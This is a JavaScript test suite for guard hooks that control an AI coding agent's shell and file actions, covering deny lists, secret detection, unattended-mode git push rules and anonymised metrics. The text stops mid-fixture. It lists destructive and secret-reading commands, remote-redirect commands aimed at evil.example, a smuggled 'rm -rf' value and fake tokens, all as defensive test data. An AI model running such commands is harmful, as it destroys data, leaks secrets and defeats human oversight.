// cuadrilla hook tests. Run: node --test plugins/cuadrilla/hooks/tests/hooks.test.mjs
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { after, describe, it } from "node:test";
import { fileURLToPath } from "node:url";
import { commandTouchesProtected, fileExtension, globToRegExp, isProtectedPath, matchesGlob, recordEvent } from "../scripts/lib.mjs";
import { aggregate, anonymize, parseArgs, readEvents, toJson, toMarkdown } from "../../skills/report/report.mjs";

const SCRIPTS = join(dirname(fileURLToPath(import.meta.url)), "..", "scripts");
const temporary = [];
after(() => temporary.forEach((dir) => rmSync(dir, { recursive: true, force: true })));

function tempDir() {
  const dir = mkdtempSync(join(tmpdir(), "cuadrilla-hooks-"));
  temporary.push(dir);
  return dir;
}

function writeFile(root, path, content) {
  const full = join(root, path);
  mkdirSync(dirname(full), { recursive: true });
  writeFileSync(full, content);
  return full;
}

function runHook(script, input, env = {}) {
  const result = spawnSync(process.execPath, [join(SCRIPTS, script)], {
    input: JSON.stringify(input),
    encoding: "utf8",
    env: { ...process.env, CLAUDE_PROJECT_DIR: "", CUADRILLA_UNATTENDED: "", CUADRILLA_AGENT_BRANCH_PREFIX: "", CUADRILLA_METRICS: "", ...env },
  });
  return { code: result.status, json: result.stdout.trim() ? JSON.parse(result.stdout) : null, stderr: result.stderr };
}

const decision = (r) => r.json?.hookSpecificOutput?.permissionDecision ?? "allow";
const emptyProject = tempDir();
const shell = (command, tool = "Bash", cwd = emptyProject) =>
  runHook("guard.mjs", { tool_name: tool, tool_input: { command }, cwd }, { CLAUDE_PROJECT_DIR: cwd });
const fileTool = (tool_name, tool_input, cwd = emptyProject) =>
  runHook("guard.mjs", { tool_name, tool_input, cwd }, { CLAUDE_PROJECT_DIR: cwd });

describe("lib", () => {
  it("globs", () => {
    assert.ok(matchesGlob("backend/src/app/x.py", "backend/**/*.py"));
    assert.ok(matchesGlob("x.py", "**/*.py"));
    assert.ok(matchesGlob("src/a/b.tsx", "**/*.{ts,tsx}"));
    assert.ok(matchesGlob("deep/dir/secrets.pem", "*.pem"));
    assert.ok(!matchesGlob("backend/src/app/x.ts", "backend/**/*.py"));
    assert.equal(globToRegExp("a/*.cs").test("a/b/c.cs"), false);
  });

  it("protected files", () => {
    for (const p of [".env", "backend/.env", "C:\\repo\\.env.local", ".env.production", "certs/server.key", "keys/id_rsa", "prod.pfx", "infra/terraform.tfstate"]) {
      assert.equal(isProtectedPath(p), true, p);
    }
    for (const p of [".env.example", "backend/.env.sample", ".envrc", ".gitignore", "env.py", "id_rsa.pub", "keyboard.ts", "appsettings.json"]) {
      assert.equal(isProtectedPath(p), false, p);
    }
    assert.equal(isProtectedPath("src/main/resources/application-prod.yml", ["application-prod.yml"]), true);
  });

  it("protected files inside commands", () => {
    assert.equal(commandTouchesProtected("cat backend/.env"), true);
    assert.equal(commandTouchesProtected("docker run --env-file=.env img"), true);
    assert.equal(commandTouchesProtected("cat backend/.env.example"), false);
    assert.equal(commandTouchesProtected("curl https://example.com/.env"), false);
  });
});

describe("guard: commands", () => {
  const denied = [
    "git push",
    "cd api && git push --force",
    "git -C repo push origin main",
    'bash -c "git push origin main"',
    "git reset --hard HEAD~1",
    "git clean -fdx",
    "git checkout -- .",
    "git commit --no-verify -m x",
    "rm -rf node_modules",
    "Remove-Item -Path dist -Recurse -Force",
    "rmdir /s /q build",
    "gh pr merge 12 --squash",
    "gh pr review 12 --approve",
    "gh secret set X",
    "gh api repos/o/r/pulls/1/merge -X PUT",
    "codex exec -s danger-full-access task",
    "claude --dangerously-skip-permissions",
    "cat backend/.env",
    'type "backend\\.env"',
    "Get-Content .env.local",
    "cat certs/server.key",
    "printenv",
    "Get-ChildItem env:",
    "railway up",
    "vercel --prod",
    "fly deploy",
    "kubectl apply -f k8s/",
    "helm upgrade api ./chart",
    "terraform apply -auto-approve",
    "aws s3 rm s3://bucket --recursive",
    "docker push org/api:latest",
    "npm publish",
    "dotnet nuget push pkg.nupkg",
    "./mvnw deploy",
    "uv publish",
  ];
  for (const command of denied) it(`denies: ${command}`, () => assert.equal(decision(shell(command)), "deny"));

  const allowed = [
    "git status --short",
    "git diff HEAD",
    'git commit -m "fix the push button and the reset --hard copy in the form"',
    "git log --oneline -5",
    "git merge --abort",
    "uv run pytest",
    "npm run build",
    "dotnet test",
    "./mvnw -q verify",
    "./gradlew test",
    "go test ./...",
    "cargo test",
    "cat backend/.env.example",
    "gh pr view 12",
    "gh pr diff 12",
    "rm dist/file.txt",
    "docker build -t api .",
    "kubectl get pods",
    "terraform plan",
    "aws s3 ls",
  ];
  for (const command of allowed) it(`allows: ${command}`, () => assert.equal(decision(shell(command)), "allow"));

  const asked = [
    'psql "$DSN" -c "DROP TABLE x"',
    "psql -f db/001_create_x.sql",
    'sqlcmd -S . -Q "DELETE FROM t"',
    "git merge feat/x",
    "git rebase main",
    "uv run alembic upgrade head",
    "dotnet ef database update",
    "npx prisma migrate deploy",
    "./mvnw flyway:migrate",
    "python manage.py migrate",
    "npm install --force",
  ];
  for (const command of asked) it(`asks: ${command}`, () => assert.equal(decision(shell(command)), "ask"));

  it("PowerShell gets the same treatment", () => assert.equal(decision(shell("git push", "PowerShell")), "deny"));

  it("honors protectedPaths from cuadrilla.json", () => {
    const project = tempDir();
    writeFile(project, ".claude/cuadrilla.json", JSON.stringify({ protectedPaths: ["appsettings.Production.json"] }));
    assert.equal(decision(shell("cat src/Api/appsettings.Production.json", "Bash", project)), "deny");
    assert.equal(decision(fileTool("Read", { file_path: "src/Api/appsettings.Production.json" }, project)), "deny");
    assert.equal(decision(fileTool("Read", { file_path: "src/Api/appsettings.json" }, project)), "allow");
  });
});

describe("guard: files and secrets", () => {
  it("blocks Read/Edit/Write on secret files", () => {
    for (const tool of ["Read", "Edit", "Write"]) {
      assert.equal(decision(fileTool(tool, { file_path: "C:\\p\\backend\\.env", content: "" })), "deny", tool);
    }
    assert.equal(decision(fileTool("Glob", { pattern: "**/.env" })), "deny");
    assert.equal(decision(fileTool("Grep", { pattern: "DSN", path: "backend/.env" })), "deny");
    assert.equal(decision(fileTool("Grep", { pattern: ".env", path: "src" })), "allow");
    assert.equal(decision(fileTool("Read", { file_path: "backend/.env.example" })), "allow");
  });

  const secrets = [
    "-----BEGIN RSA PRIVATE KEY-----\nabc",
    "KEY = 'AKIAABCDEFGHIJKLMNOP'",
    `token = "ghp_${"a".repeat(36)}"`,
    `ANTHROPIC = "sk-ant-${"b".repeat(40)}"`,
    `stripe = "sk_live_${"c".repeat(24)}"`,
    "DSN=postgresql://app:Sup3rS3cret!@db.prod:5432/app",
    '"Default": "Server=db.prod;Database=App;User Id=app;Password=Sup3rS3cret!;"',
    "spring.datasource.url=jdbc:mysql://app:Sup3rS3cret@db:3306/app",
  ];
  for (const content of secrets) {
    it(`blocks writing a secret: ${content.slice(0, 40)}`, () =>
      assert.equal(decision(fileTool("Write", { file_path: "src/x.txt", content })), "deny"));
  }

  const fine = [
    "APP_DB_DSN=postgresql://user:password@localhost:5432/app",
    "APP_DB_DSN=postgresql://postgres:postgres@localhost:5432/app",
    "APP_DB_DSN=postgresql://app:${DB_PASSWORD}@localhost/app",
    '"Default": "Server=localhost;Database=App;User Id=sa;Password=<password>;"',
    "user.Password = request.Password;",
    "var hash = BCrypt.HashPassword(dto.Password);",
    "def add(a: int, b: int) -> int:\n    return a + b\n",
  ];
  for (const content of fine) {
    it(`allows normal content: ${content.slice(0, 40)}`, () =>
      assert.equal(decision(fileTool("Write", { file_path: "backend/.env.example", content })), "allow"));
  }

  it("checks Edit and MultiEdit new text", () => {
    const secret = `const k = "ghp_${"c".repeat(36)}"`;
    assert.equal(decision(fileTool("Edit", { file_path: "a.ts", old_string: "a", new_string: secret })), "deny");
    assert.equal(decision(fileTool("MultiEdit", { file_path: "a.ts", edits: [{ old_string: "a", new_string: secret }] })), "deny");
  });
});

describe("guard: unattended mode", () => {
  const unattended = (command, env = {}) =>
    runHook(
      "guard.mjs",
      { tool_name: "Bash", tool_input: { command }, cwd: emptyProject },
      { CLAUDE_PROJECT_DIR: emptyProject, CUADRILLA_UNATTENDED: "1", ...env },
    );

  const allowedPushes = [
    "git push origin agent/42-login",
    "git push -u origin agent/42-login",
    "git push --set-upstream origin agent/fix/nav-bar",
    "git push origin HEAD:agent/42-login",
    "git push origin refs/heads/agent/42:refs/heads/agent/42",
    "git -C repo push -u origin agent/42",
  ];
  for (const command of allowedPushes) {
    it(`allows a plain agent-branch push: ${command}`, () => assert.equal(decision(unattended(command)), "allow"));
  }

  const deniedPushes = [
    "git push",
    "git push origin",
    "git push origin main",
    "git push origin HEAD:main",
    "git push origin agent/",
    "git push upstream agent/42",
    "git push --force origin agent/42",
    "git push -f origin agent/42",
    "git push --force-with-lease origin agent/42",
    "git push origin +agent/42",
    "git push origin +HEAD:agent/42",
    "git push origin :agent/42",
    "git push --delete origin agent/42",
    "git push origin --tags",
    "git push --mirror origin",
    "git push origin agent/42 main",
    "git push origin agent/../main",
    "git push origin agent/42:main",
    "git push origin HEAD:agent/x.lock",
    "git commit -m x && git push origin agent/42",
    "git push origin agent/42; git push origin main",
    'bash -c "git push origin agent/42"',
    "git push origin $(git branch --show-current)",
    "git push origin agent/42 --no-verify",
  ];
  for (const command of deniedPushes) {
    it(`still denies: ${command}`, () => assert.equal(decision(unattended(command)), "deny"));
  }

  it("explains which push is allowed", () => {
    assert.match(unattended("git push origin main").json.hookSpecificOutput.permissionDecisionReason, /origin agent\/<name>/);
  });

  it("honors a custom branch prefix and ignores an unsafe one", () => {
    assert.equal(decision(unattended("git push origin bot/42", { CUADRILLA_AGENT_BRANCH_PREFIX: "bot/" })), "allow");
    assert.equal(decision(unattended("git push origin agent/42", { CUADRILLA_AGENT_BRANCH_PREFIX: "bot/" })), "deny");
    for (const prefix of ["", "/", "main", "*", "../", "a b/"]) {
      assert.equal(decision(unattended("git push origin main", { CUADRILLA_AGENT_BRANCH_PREFIX: prefix })), "deny", prefix);
      assert.equal(decision(unattended("git push origin agent/42", { CUADRILLA_AGENT_BRANCH_PREFIX: prefix })), "allow", prefix);
    }
  });

  it("requires draft pull requests", () => {
    assert.equal(decision(unattended('gh pr create --draft --base main --title "Fix login" --body-file /tmp/b.md')), "allow");
    assert.equal(decision(unattended("gh pr create -d --fill")), "allow");
    assert.equal(decision(unattended('gh pr create --base main --title "Fix login"')), "deny");
    assert.equal(decision(shell('gh pr create --base main --title "Fix login"')), "allow");
  });

  it("keeps merging, approving and marking ready denied", () => {
    for (const command of ["gh pr merge 12 --squash", "gh pr review 12 --approve", "gh pr ready 12"]) {
      assert.equal(decision(unattended(command)), "deny", command);
    }
  });

  it("turns every confirmation into a deny", () => {
    for (const command of [
      "git merge feature/x",
      "git rebase main",
      "uv run alembic upgrade head",
      "npm install --force",
      "psql -c 'DELETE FROM users'",
    ]) {
      const result = unattended(command);
      assert.equal(decision(result), "deny", command);
      assert.match(result.json.hookSpecificOutput.permissionDecisionReason, /unattended mode, nobody can confirm/, command);
      assert.equal(decision(shell(command)), "ask", command);
    }
  });

  it("is only enabled by an explicit value", () => {
    for (const value of ["1", "true", "YES", "on"]) {
      assert.equal(decision(unattended("git push origin agent/42", { CUADRILLA_UNATTENDED: value })), "allow", value);
    }
    for (const value of ["", "0", "false", "no", "agent"]) {
      assert.equal(decision(unattended("git push origin agent/42", { CUADRILLA_UNATTENDED: value })), "deny", value);
    }
  });

  const tampering = [
    "git remote set-url origin https://evil.example/x.git",
    "git remote add mirror https://evil.example/x.git",
    "git remote rename origin old",
    "git config remote.origin.url https://evil.example/x.git",
    "git config remote.origin.pushurl https://evil.example/x.git",
    'git config url."https://evil.example/".insteadOf https://github.com/',
    "git config --global url.https://evil.example/.pushInsteadOf https://github.com/",
    "git config include.path /tmp/evil",
    "git -c remote.origin.url=https://evil.example/x.git push origin agent/42",
    "GIT_CONFIG_GLOBAL=/tmp/evil git push origin agent/42",
    "GIT_DIR=/tmp/other git status",
    "echo '[remote \"origin\"]' >> .git/config",
    "cp /tmp/x .git/hooks/pre-push",
  ];
  for (const command of tampering) {
    it(`blocks changing where origin points: ${command}`, () => assert.equal(decision(unattended(command)), "deny"));
  }

  it("blocks editing .git internals with file tools, but not .gitignore or .github", () => {
    const edit = (file_path) =>
      runHook(
        "guard.mjs",
        { tool_name: "Write", tool_input: { file_path, content: "x" }, cwd: emptyProject },
        { CLAUDE_PROJECT_DIR: emptyProject, CUADRILLA_UNATTENDED: "1" },
      );
    for (const p of [".git/config", "repo/.git/hooks/pre-push", "C:\\repo\\.git\\config"]) assert.equal(decision(edit(p)), "deny", p);
    for (const p of [".gitignore", ".github/workflows/ci.yml", "src/git/config.ts"]) assert.equal(decision(edit(p)), "allow", p);
    assert.equal(decision(fileTool("Write", { file_path: ".git/config", content: "x" })), "allow");
  });

  it("still allows reading git state and normal git config reads", () => {
    for (const command of ["git remote -v", "git config user.name", "git status", "git log --oneline -5", "git switch -c agent/42-login"]) {
      assert.equal(decision(unattended(command)), "allow", command);
    }
  });

  it("cannot be enabled from cuadrilla.json", () => {
    const project = tempDir();
    writeFile(project, ".claude/cuadrilla.json", JSON.stringify({ unattended: true, CUADRILLA_UNATTENDED: "1" }));
    assert.equal(decision(shell("git push origin agent/42", "Bash", project)), "deny");
  });
});

describe("session-context", () => {
  it("reports missing profile, config and language", () => {
    const dir = tempDir();
    writeFile(dir, "CLAUDE.md", "# Project\n\n## Domain\nsomething\n");
    const r = runHook("session-context.mjs", { cwd: dir }, { CLAUDE_PROJECT_DIR: dir, CLAUDE_PLUGIN_OPTION_RESPONSE_LANGUAGE: "Español" });
    const context = r.json.hookSpecificOutput.additionalContext;
    assert.match(context, /no '## Project profile' section/);
    assert.match(context, /not a git repository/);
    assert.match(context, /cuadrilla\.json does not exist/);
    assert.match(context, /in Español/);
  });

  it("counts pending profile values (Spanish heading) and lists components", () => {
    const dir = tempDir();
    writeFile(dir, "CLAUDE.md", "# P\n\n## Perfil del proyecto\n| a | `<app>` |\n| b | TODO |\n### Sub\n| c | ok |\n\n## Dominio\n<not counted>\n");
    writeFile(dir, ".claude/cuadrilla.json", JSON.stringify({ language: "Português", components: [{ name: "api", path: "api", stack: "dotnet" }] }));
    const context = runHook("session-context.mjs", { cwd: dir }, { CLAUDE_PROJECT_DIR: dir }).json.hookSpecificOutput.additionalContext;
    assert.match(context, /with 2 pending values/);
    assert.match(context, /api \(dotnet, api\)/);
    assert.match(context, /in Português/);
  });

  it("announces unattended mode and its push rule only when enabled", () => {
    const dir = tempDir();
    const attended = runHook("session-context.mjs", { cwd: dir }, { CLAUDE_PROJECT_DIR: dir }).json.hookSpecificOutput.additionalContext;
    assert.doesNotMatch(attended, /UNATTENDED MODE/);
    const context = runHook("session-context.mjs", { cwd: dir }, { CLAUDE_PROJECT_DIR: dir, CUADRILLA_UNATTENDED: "1", CUADRILLA_AGENT_BRANCH_PREFIX: "bot/" })
      .json.hookSpecificOutput.additionalContext;
    assert.match(context, /UNATTENDED MODE/);
    assert.match(context, /git push -u origin bot\/<name>/);
    assert.match(context, /gh pr create --draft/);
  });
});

describe("stop-check", () => {
  function repoWith(files, config) {
    const dir = tempDir();
    const g = (...args) => spawnSync("git", args, { cwd: dir, encoding: "utf8" });
    g("init", "-q");
    g("config", "user.email", "test@example.com");
    g("config", "user.name", "test");
    writeFile(dir, "README.md", "x\n");
    g("add", ".");
    g("commit", "-qm", "init");
    if (config) writeFile(dir, ".claude/cuadrilla.json", JSON.stringify(config));
    for (const [path, content] of Object.entries(files)) writeFile(dir, path, content);
    return dir;
  }
  const stop = (dir, extra = {}) => runHook("stop-check.mjs", { cwd: dir, ...extra }, { CLAUDE_PROJECT_DIR: dir });

  it("flags forbidden patterns across languages", () => {
    const dir = repoWith({
      "backend/app/core/x.py": 'print("hi")\nrows = await cur.execute(f"SELECT {x}")\n',
      "web/src/pages/A.tsx": "const a: any = 1;\nconsole.log(a);\n",
      "api/Services/S.cs": 'Console.WriteLine("x");\nvar r = conn.Query<User>($"SELECT * FROM u WHERE id = {id}");\n',
      "svc/src/main/java/App.java": 'System.out.println("x");\nString q = jdbc.query("SELECT * FROM u WHERE id = " + id);\n',
      "cmd/main.go": 'fmt.Println("x")\n',
      "backend/tests/test_x.py": 'print("allowed in tests")\n',
      "notes.txt": "<<<<<<< HEAD\n",
    });
    const reason = stop(dir).json?.reason ?? "";
    for (const text of ["print()", "f-string", "type any", "console.log", "Console.Write", "string interpolation", "System.out", "string concatenation", "fmt.Print", "merge conflict"]) {
      assert.ok(reason.includes(text), text);
    }
    assert.ok(!reason.includes("test_x.py"));
  });

  it("applies project patterns from cuadrilla.json and reports invalid ones", () => {
    const dir = repoWith(
      { "backend/app/repo.py": "from sqlalchemy.orm import Session\n" },
      { forbidden: [{ glob: "backend/**/*.py", pattern: "from sqlalchemy", message: "ORM is not allowed" }, { pattern: "([" }] },
    );
    const reason = stop(dir).json.reason;
    assert.match(reason, /ORM is not allowed/);
    assert.match(reason, /Invalid regex/);
  });

  it("stays quiet for clean code, when disabled, and on the second stop", () => {
    const clean = repoWith({ "backend/app/ok.py": "def f() -> int:\n    return 1\n" });
    assert.equal(stop(clean).json, null);
    const dirty = repoWith({ "app/bad.py": 'print("x")\n' });
    assert.equal(stop(dirty, { stop_hook_active: true }).json, null);
    const disabled = repoWith({ "app/bad.py": 'print("x")\n' }, { stopCheck: false });
    assert.equal(stop(disabled).json, null);
    const noBuiltins = repoWith({ "app/bad.py": 'print("x")\n' }, { builtinPatterns: false });
    assert.equal(stop(noBuiltins).json, null);
  });
});

describe("format", () => {
  it("does nothing for missing files or files outside any project", () => {
    const r = runHook("format.mjs", { tool_name: "Write", tool_input: { file_path: join(tmpdir(), "missing.py") } });
    assert.equal(r.code, 0);
    assert.equal(r.json, null);
  });

  it("runs configured formatters and reports configured linters", () => {
    const dir = tempDir();
    const script = writeFile(
      dir,
      "tools/fake.mjs",
      "import { appendFileSync } from 'node:fs';\n" +
        "const [mode, file] = process.argv.slice(2);\n" +
        "if (mode === 'format') appendFileSync(file, '// formatted\\n');\n" +
        "else { console.log(file + ':1:1: E001 fake lint error'); process.exit(1); }\n",
    );
    writeFile(
      dir,
      ".claude/cuadrilla.json",
      JSON.stringify({
        components: [
          {
            name: "api",
            path: "api",
            format: [{ glob: "**/*.cs", run: [process.execPath, script, "format", "{file}"] }],
            lint: [{ glob: "**/*.cs", run: [process.execPath, script, "lint", "{file}"] }],
          },
        ],
      }),
    );
    const file = writeFile(dir, "api/Services/S.cs", "class S {}\n");
    const r = runHook("format.mjs", { tool_name: "Write", tool_input: { file_path: file }, cwd: dir }, { CLAUDE_PROJECT_DIR: dir });
    assert.match(r.json.hookSpecificOutput.additionalContext, /E001 fake lint error/);
    assert.match(spawnSync(process.execPath, ["-e", `process.stdout.write(require('fs').readFileSync(${JSON.stringify(file)},'utf8'))`], { encoding: "utf8" }).stdout, /\/\/ formatted/);
  });

  it('uses the fallback when the tool is missing, runs "node" entries and parses ESLint stylish output', () => {
    const dir = tempDir();
    // A fake linter that prints ESLint's default (stylish) format and fails.
    writeFile(
      dir,
      "web/node_modules/fake-eslint/bin/eslint.js",
      "const file = process.argv[2];\n" +
        "console.log('\\n' + file);\n" +
        "console.log('  1:1  error  Use the @/ alias instead of ../ imports  no-restricted-imports');\n" +
        "console.log('\\n✖ 1 problem (1 error, 0 warnings)');\n" +
        "process.exit(1);\n",
    );
    writeFile(
      dir,
      ".claude/cuadrilla.json",
      JSON.stringify({
        components: [
          {
            name: "web",
            path: "web",
            lint: [
              {
                glob: "**/*.tsx",
                run: ["node", "node_modules/not-installed/bin/eslint_d.js", "{file}"],
                fallback: ["node", "node_modules/fake-eslint/bin/eslint.js", "{file}"],
              },
            ],
          },
        ],
      }),
    );
    const file = writeFile(dir, "web/src/A.tsx", "export const a = 1;\n");
    const r = runHook("format.mjs", { tool_name: "Write", tool_input: { file_path: file }, cwd: dir }, { CLAUDE_PROJECT_DIR: dir });
    const context = r.json?.hookSpecificOutput?.additionalContext ?? "";
    assert.match(context, /1:1 {2}error {2}Use the @\/ alias/);
    assert.doesNotMatch(context, /MODULE_NOT_FOUND|Cannot find module/);
  });

  it("stays silent when the tool is missing and there is no fallback", () => {
    const dir = tempDir();
    writeFile(
      dir,
      ".claude/cuadrilla.json",
      JSON.stringify({ components: [{ name: "web", path: "web", lint: [{ glob: "**/*.tsx", run: ["node", "node_modules/nope/x.js", "{file}"] }] }] }),
    );
    const file = writeFile(dir, "web/src/A.tsx", "export const a = 1;\n");
    const r = runHook("format.mjs", { tool_name: "Write", tool_input: { file_path: file }, cwd: dir }, { CLAUDE_PROJECT_DIR: dir });
    assert.equal(r.json, null);
  });
});

// --- Metrics ------------------------------------------------------------------------------

const metricsOf = (dir) => {
  const file = join(dir, ".claude", "cuadrilla", "metrics.jsonl");
  return existsSync(file) ? readFileSync(file, "utf8").trim().split("\n").filter(Boolean).map((l) => JSON.parse(l)) : [];
};
const rawMetrics = (dir) => {
  const file = join(dir, ".claude", "cuadrilla", "metrics.jsonl");
  return existsSync(file) ? readFileSync(file, "utf8") : "";
};
const guardIn = (dir, tool_name, tool_input, env = {}) =>
  runHook("guard.mjs", { tool_name, tool_input, cwd: dir, session_id: "sess-1" }, { CLAUDE_PROJECT_DIR: dir, ...env });

describe("metrics: recording", () => {
  it("records a guard deny with its rule id only, never the command", () => {
    const dir = tempDir();
    assert.equal(decision(guardIn(dir, "Bash", { command: "cd api && git push --force origin main" })), "deny");
    const [event, ...rest] = metricsOf(dir);
    assert.equal(rest.length, 0);
    assert.deepEqual(
      { kind: event.kind, decision: event.decision, rule: event.rule, tool: event.tool, session: event.session, unattended: event.unattended, v: event.v },
      { kind: "guard", decision: "deny", rule: "push", tool: "Bash", session: "sess-1", unattended: false, v: 1 },
    );
    assert.ok(!Number.isNaN(Date.parse(event.ts)));
    assert.doesNotMatch(rawMetrics(dir), /--force|origin|main|api/);
  });

  it("ignores itself in git", () => {
    const dir = tempDir();
    guardIn(dir, "Bash", { command: "git push" });
    assert.match(readFileSync(join(dir, ".claude", "cuadrilla", ".gitignore"), "utf8"), /^\*$/m);
  });

  it("records confirmations and unattended denies with their rule", () => {
    const dir = tempDir();
    assert.equal(decision(guardIn(dir, "Bash", { command: "git rebase main" })), "ask");
    assert.equal(decision(guardIn(dir, "Bash", { command: "uv run alembic upgrade head" }, { CUADRILLA_UNATTENDED: "1" })), "deny");
    assert.deepEqual(
      metricsOf(dir).map((e) => [e.decision, e.rule, e.unattended]),
      [["ask", "merge-rebase", false], ["deny", "db-migration", true]],
    );
  });

  it("gives every guard block a rule id", () => {
    const dir = tempDir();
    guardIn(dir, "Read", { file_path: "backend/.env" });
    guardIn(dir, "Write", { file_path: "a.ts", content: `const k = "ghp_${"d".repeat(36)}"` });
    guardIn(dir, "Bash", { command: "psql -c 'DELETE FROM users'" });
    guardIn(dir, "Bash", { command: "git remote set-url origin https://evil.example/x.git" }, { CUADRILLA_UNATTENDED: "1" });
    guardIn(dir, "Write", { file_path: ".git/config", content: "x" }, { CUADRILLA_UNATTENDED: "1" });
    guardIn(dir, "Bash", { command: 'gh pr create --title "x"' }, { CUADRILLA_UNATTENDED: "1" });
    assert.deepEqual(metricsOf(dir).map((e) => e.rule), ["secret-file", "secret-in-content", "sql", "remote-tampering", "git-internals", "draft-pr-required"]);
    assert.doesNotMatch(rawMetrics(dir), /ghp_|DELETE|evil|\.env|config/);
  });

  it("records nothing for allowed calls", () => {
    const dir = tempDir();
    for (const command of ["git status", "npm test", "git push origin agent/1"]) {
      guardIn(dir, "Bash", { command }, command.includes("agent/") ? { CUADRILLA_UNATTENDED: "1" } : {});
    }
    guardIn(dir, "Read", { file_path: "src/app.ts" });
    assert.equal(rawMetrics(dir), "");
  });

  it("can be turned off from the config or the environment", () => {
    const fromConfig = tempDir();
    writeFile(fromConfig, ".claude/cuadrilla.json", JSON.stringify({ metrics: false }));
    guardIn(fromConfig, "Bash", { command: "git push" });
    assert.equal(existsSync(join(fromConfig, ".claude", "cuadrilla")), false);
    const fromEnv = tempDir();
    for (const value of ["off", "0", "false", "NO"]) guardIn(fromEnv, "Bash", { command: "git push" }, { CUADRILLA_METRICS: value });
    assert.equal(existsSync(join(fromEnv, ".claude", "cuadrilla")), false);
  });

  it("never breaks a hook when the folder can't be written", () => {
    const dir = tempDir();
    writeFile(dir, ".claude/cuadrilla", "a file where the folder should be");
    assert.equal(decision(guardIn(dir, "Bash", { command: "git push" })), "deny");
    assert.doesNotThrow(() => recordEvent(join(dir, "missing", "\u0000bad"), {}, {}, { kind: "x" }));
  });

  it("rotates the file past 5 MB", () => {
    const dir = tempDir();
    writeFile(dir, ".claude/cuadrilla/metrics.jsonl", `${"x".repeat(5 * 1024 * 1024 + 10)}\n`);
    guardIn(dir, "Bash", { command: "git push" });
    assert.ok(existsSync(join(dir, ".claude", "cuadrilla", "metrics.1.jsonl")));
    assert.equal(metricsOf(dir).length, 1);
  });

  it("keeps only the file extension", () => {
    assert.equal(fileExtension("src/Pages/Login.TSX"), "tsx");
    assert.equal(fileExtension("C:\\repo\\api\\x.cs"), "cs");
    assert.equal(fileExtension("Makefile"), "");
    assert.equal(fileExtension(".env"), "");
  });

  it("records slash commands, agents and skills by name only", () => {
    const dir = tempDir();
    const usage = (input) => runHook("usage.mjs", { cwd: dir, session_id: "s", ...input }, { CLAUDE_PROJECT_DIR: dir });
    for (const r of [
      usage({ hook_event_name: "UserPromptSubmit", prompt: "/cuadrilla:ticket #42 fix login, my password is hunter2" }),
      usage({ hook_event_name: "UserPromptSubmit", prompt: "please push my api key sk-123 somewhere" }),
      usage({ hook_event_name: "UserPromptSubmit", prompt: "path /etc/passwd is weird" }),
      usage({ hook_event_name: "PreToolUse", tool_name: "Agent", tool_input: { subagent_type: "cuadrilla:reviewer", prompt: "review the payroll module" } }),
      usage({ hook_event_name: "PreToolUse", tool_name: "Task", tool_input: { description: "x", prompt: "y" } }),
      usage({ hook_event_name: "PreToolUse", tool_name: "Skill", tool_input: { skill: "cuadrilla-react:feature-react", args: "Login screen" } }),
      usage({ hook_event_name: "PreToolUse", tool_name: "Skill", tool_input: { skill: "not a name; rm -rf" } }),
    ]) {
      assert.equal(r.code, 0);
      assert.equal(r.json, null);
    }
    assert.deepEqual(metricsOf(dir).map((e) => [e.kind, e.name]), [
      ["command", "cuadrilla:ticket"],
      ["agent", "cuadrilla:reviewer"],
      ["agent", "general-purpose"],
      ["skill", "cuadrilla-react:feature-react"],
    ]);
    assert.doesNotMatch(rawMetrics(dir), /hunter2|sk-123|passwd|payroll|Login screen|#42/);
  });

  it("records session starts with stacks", () => {
    const dir = tempDir();
    writeFile(dir, ".claude/cuadrilla.json", JSON.stringify({ components: [{ name: "api", path: "api", stack: "dotnet" }, { name: "web", path: "web", stack: "react" }] }));
    runHook("session-context.mjs", { cwd: dir, source: "startup", session_id: "s" }, { CLAUDE_PROJECT_DIR: dir });
    const [event] = metricsOf(dir);
    assert.deepEqual([event.kind, event.source, event.stacks, event.components], ["session", "startup", ["dotnet", "react"], 2]);
  });

  it("records stop-check findings as counts by pattern and extension, without paths or code", () => {
    const dir = tempDir();
    const g = (...args) => spawnSync("git", args, { cwd: dir, encoding: "utf8" });
    g("init", "-q");
    g("config", "user.email", "test@example.com");
    g("config", "user.name", "test");
    writeFile(dir, "README.md", "x\n");
    g("add", ".");
    g("commit", "-qm", "init");
    writeFile(dir, ".claude/cuadrilla.json", JSON.stringify({ forbidden: [{ glob: "**/*.ts", pattern: "legacyApi\\(", message: "legacy API | use v2" }] }));
    writeFile(dir, "web/src/secretPayroll.ts", 'console.log("salary");\nconsole.log(2);\nlegacyApi();\n');
    runHook("stop-check.mjs", { cwd: dir, session_id: "s" }, { CLAUDE_PROJECT_DIR: dir });
    const [event] = metricsOf(dir);
    assert.equal(event.kind, "stop-check");
    assert.equal(event.findings, 3);
    assert.deepEqual(
      event.patterns.map((p) => [p.rule, p.source, p.ext, p.count]).sort(),
      [["console.log in application code", "builtin", "ts", 2], ["legacy API | use v2", "project", "ts", 1]],
    );
    assert.doesNotMatch(rawMetrics(dir), /secretPayroll|salary|web\/src/);
  });

  it("records lint problems per component", () => {
    const dir = tempDir();
    const script = writeFile(dir, "tools/lint.mjs", "console.log(process.argv[2] + ':1:1: E1 bad'); console.log(process.argv[2] + ':2:1: E2 bad'); process.exit(1);\n");
    writeFile(dir, ".claude/cuadrilla.json", JSON.stringify({ components: [{ name: "api", path: "api", lint: [{ glob: "**/*.cs", run: [process.execPath, script, "{file}"] }] }] }));
    const file = writeFile(dir, "api/Services/PayrollService.cs", "class X {}\n");
    runHook("format.mjs", { tool_name: "Write", tool_input: { file_path: file }, cwd: dir, session_id: "s" }, { CLAUDE_PROJECT_DIR: dir });
    const [event] = metricsOf(dir);
    assert.deepEqual([event.kind, event.component, event.ext, event.problems], ["lint", "api", "cs", 2]);
    assert.doesNotMatch(rawMetrics(dir), /Payroll|Services/);
  });
});

describe("metrics: report", () => {
  const at = (day, extra) => ({ v: 1, ts: `2026-10-${String(day).padStart(2, "0")}T12:00:00.000Z`, unattended: false, ...extra });
  const fixture = [
    at(1, { session: "a", kind: "session", stacks: ["python-fastapi", "react"] }),
    at(1, { session: "a", kind: "guard", decision: "deny", rule: "push", tool: "Bash" }),
    at(2, { session: "b", kind: "guard", decision: "deny", rule: "push", tool: "Bash" }),
    at(2, { session: "b", kind: "guard", decision: "deny", rule: "push", tool: "Bash", unattended: true }),
    at(2, { session: "b", kind: "guard", decision: "ask", rule: "merge-rebase", tool: "Bash" }),
